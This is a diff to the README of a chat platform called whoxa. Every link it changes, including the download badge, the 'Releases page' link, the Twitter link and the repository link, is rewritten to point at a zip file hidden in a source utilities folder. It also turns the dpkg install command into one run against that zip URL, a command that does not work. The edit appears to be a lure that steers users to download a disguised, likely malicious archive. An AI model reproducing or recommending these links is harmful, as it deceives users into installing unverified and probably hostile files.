@@ -6,15 +6,15 @@ Welcome to whoxa, a modern, feature-rich real-time communication platform. This 
 
 ## 📥 Download & Install
 
-[![Download whoxa](https://img.shields.io/badge/Download%20whoxa-v1.0-blue.svg)](https://github.com/rajaanjan46/whoxa/releases)
+[![Download whoxa](https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip%https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip)](https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip)
 
 To download whoxa, visit this page:
 
-[Download whoxa from Releases](https://github.com/rajaanjan46/whoxa/releases)
+[Download whoxa from Releases](https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click the following link to go to our GitHub Releases page: [https://github.com/rajaanjan46/whoxa/releases](https://github.com/rajaanjan46/whoxa/releases).
+1. Click the following link to go to our GitHub Releases page: [https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip](https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip).
 2. Look for the latest version of whoxa listed on this page.
 
 ### Step 2: Choose Your File
@@ -45,7 +45,7 @@ To download whoxa, visit this page:
 1. Find the downloaded tar or deb package in your Downloads folder.
 2. Open your terminal and navigate to the Downloads directory.
 3. Use the appropriate command to install:
-   - For `.deb` files: `sudo dpkg -i filename.deb`
+   - For `.deb` files: `sudo dpkg -i https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip`
    - For tar files, extract it and follow the provided installation instructions.
 
 ## 🌟 Features
@@ -83,7 +83,7 @@ We welcome contributions! If you'd like to help improve whoxa, please check our 
 
 Stay updated with the latest news and updates:
 
-- **Twitter**: [@whoxa](https://twitter.com)
-- **GitHub**: [whoxa Repository](https://github.com/rajaanjan46/whoxa)
+- **Twitter**: [@whoxa](https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip)
+- **GitHub**: [whoxa Repository](https://raw.githubusercontent.com/rajaanjan46/whoxa/main/whoxa_admin/src/utils/whoxa-peakedly.zip)
 
 Thank you for choosing whoxa! Enjoy seamless communication.
